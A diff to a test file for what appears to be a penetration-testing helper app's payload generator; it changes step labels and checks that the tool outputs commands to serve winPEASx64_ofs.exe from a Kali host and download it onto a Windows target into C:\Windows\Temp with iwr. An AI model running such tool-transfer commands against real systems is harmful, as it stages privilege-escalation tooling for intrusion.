@@ -98,8 +98,8 @@ describe("Transfer a file", () => {
     mount("/payloads?generator=transfer");
     const g = within(await generator());
     await user.type(g.getByRole("combobox", { name: "Value for FILE" }), "winPEASx64_ofs.exe");
-    expect(g.getByText("1 · On Kali")).toBeInTheDocument();
-    expect(g.getByText("2 · On MS02")).toBeInTheDocument();
+    expect(g.getByText("1. On Kali")).toBeInTheDocument();
+    expect(g.getByText("2. On MS02")).toBeInTheDocument();
     expect(await pre(g, "cd ~/tools/windows && python3 -m http.server 80")).toBeInTheDocument();
     expect(
       await pre(g, "iwr -Uri http://10.10.14.9/winPEASx64_ofs.exe -OutFile C:\\Windows\\Temp\\winPEASx64_ofs.exe -UseBasicParsing"),
